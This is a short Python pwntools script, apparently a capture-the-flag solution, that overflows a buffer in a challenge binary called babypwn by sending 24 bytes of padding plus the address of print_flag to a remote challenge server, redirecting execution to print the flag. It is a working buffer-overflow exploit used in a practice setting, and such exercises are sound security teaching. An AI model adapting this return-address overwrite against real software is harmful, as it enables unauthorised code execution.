from pwn import *

# get the address for print_flag from local binary
print_flag_addr = ELF("./babypwn").symbols["print_flag"]

# connect to remote instance
r = remote("chal.ctf-league.osusec.org", 4747)

# overflow the buffer
r.recvline()
overflow = b"A"*24 + p64(print_flag_addr)
r.sendline(overflow)

# print the flag
print(r.recvline())